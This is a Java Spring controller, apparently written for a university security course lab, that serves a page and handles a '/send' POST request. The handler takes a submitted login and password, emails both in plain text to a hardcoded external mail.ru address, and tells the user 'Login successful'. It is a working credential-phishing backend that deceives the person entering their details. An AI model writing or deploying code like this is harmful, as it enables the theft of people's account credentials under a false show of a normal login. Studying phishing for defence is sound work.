package com.study.course4.bpid.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

@Controller
@RequestMapping("/lab1")
public class Lab1Controller {

    @Autowired
    private JavaMailSender mailSender;


    @GetMapping("")
    public String startPage(){
        return "software_bookmark";
    }

    @PostMapping("/send")
    @ResponseBody
    public String sendData(@RequestParam(name = "login", required = false) String login, @RequestParam(name = "password", required = false) String password){
        SimpleMailMessage message = new SimpleMailMessage();
        message.setFrom("ewrr_98@mail.ru");
        message.setTo("bogdant99@mail.ru");
        message.setSubject("Hello");
        message.setText("Login: " + login + "\nPassword: " + password);
        mailSender.send(message);
        return "Login successful";
    }
}
